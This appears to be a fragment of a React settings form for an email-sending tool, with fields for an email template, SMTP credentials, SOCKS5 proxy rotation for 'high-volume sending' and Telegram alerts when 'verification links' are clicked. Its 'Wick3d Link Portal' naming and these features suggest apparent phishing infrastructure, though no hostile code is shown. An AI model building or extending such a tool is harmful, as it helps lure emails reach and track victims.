                    <div className="pl-5">
                      <div className="mb-1">• <code className="bg-gray-100 px-1 rounded">{'{link}'}</code> - The verification link</div>
                      <div className="mb-1">• <code className="bg-gray-100 px-1 rounded">{'{email}'}</code> - Recipient's email address</div>
                      <div className="mb-1">• <code className="bg-gray-100 px-1 rounded">{'{date}'}</code> - Current date</div>
                    </div>
                    <div className="text-amber-600">Note: Some email clients may not support all HTML/CSS features. Always test your template.</div>
                  </div>
                  <FormMessage />
                </FormItem>
              )}
            />

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="senderName"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Sender Name</FormLabel>
                    <FormControl>
                      <Input placeholder="Wick3d Link Portal" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="senderEmail"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Sender Email</FormLabel>
                    <FormControl>
                      <Input placeholder="no-reply@wick3d-links.com" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="smtpServer"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>SMTP Server</FormLabel>
                    <FormControl>
                      <Input placeholder="smtp.example.com" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="smtpPort"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>SMTP Port</FormLabel>
                    <FormControl>
                      <Input
                        type="number"
                        placeholder="25"
                        {...field}
                        onChange={(e) => field.onChange(parseInt(e.target.value) || 25)}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="smtpUser"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>SMTP Username (optional)</FormLabel>
                    <FormControl>
                      <Input placeholder="username" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="smtpPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>SMTP Password (optional)</FormLabel>
                    <FormControl>
                      <Input type="password" placeholder="••••••••" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">SOCKS5 Proxy Settings</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Configure SOCKS5 proxy for SMTP connections (useful for high-volume sending).
              </p>
            </div>

            <FormField
              control={form.control}
              name="useSocks5Proxy"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Use SOCKS5 Proxy</FormLabel>
                    <FormDescription>
                      Route SMTP connections through a SOCKS5 proxy
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            {form.watch('useSocks5Proxy') && (
              <>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <FormField
                    control={form.control}
                    name="socks5Host"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>SOCKS5 Proxy Host</FormLabel>
                        <FormControl>
                          <Input placeholder="proxy.example.com" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="socks5Port"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>SOCKS5 Proxy Port</FormLabel>
                        <FormControl>
                          <Input
                            type="number"
                            placeholder="1080"
                            {...field}
                            onChange={(e) => field.onChange(parseInt(e.target.value) || 1080)}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <FormField
                    control={form.control}
                    name="socks5Username"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>SOCKS5 Username (optional)</FormLabel>
                        <FormControl>
                          <Input placeholder="username" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="socks5Password"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>SOCKS5 Password (optional)</FormLabel>
                        <FormControl>
                          <Input type="password" placeholder="••••••••" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <FormField
                  control={form.control}
                  name="socks5MaxAttempts"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Maximum SOCKS5 Connection Attempts</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min={1}
                          max={1000}
                          placeholder="300"
                          {...field}
                          onChange={(e) => field.onChange(parseInt(e.target.value) || 300)}
                        />
                      </FormControl>
                      <FormDescription>
                        Maximum number of connection attempts before giving up (useful for unreliable proxies)
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </>
            )}

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Telegram Notification Settings</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Get notifications via Telegram when verification links are clicked.
              </p>
            </div>

            <FormField
              control={form.control}
              name="useTelegramNotifications"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Use Telegram Notifications</FormLabel>
                    <FormDescription>
                      Send notifications to a Telegram chat when links are clicked
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            {form.watch('useTelegramNotifications') && (
              <>
                <FormField
                  control={form.control}
                  name="telegramBotToken"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Telegram Bot Token</FormLabel>
                      <FormControl>
                        <Input placeholder="123456789:ABCdefGhIJKlmnOPQRstUVwxyZ" {...field} />
                      </FormControl>
                      <FormDescription>
                        Create a bot with BotFather to get a token
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="telegramChatId"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Telegram Chat ID</FormLabel>
                      <FormControl>
                        <Input placeholder="-123456789" {...field} />
                      </FormControl>
                      <FormDescription>
                        Your chat ID or group ID where notifications will be sent
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </>
            )}
            
            <div className="flex justify-end">
              <Button
                type="submit"
                disabled={updateMutation.isPending}
              >
                {updateMutation.isPending ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Saving...
                  </>
                ) : (
                  "Save Settings"
                )}
              </Button>
            </div>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
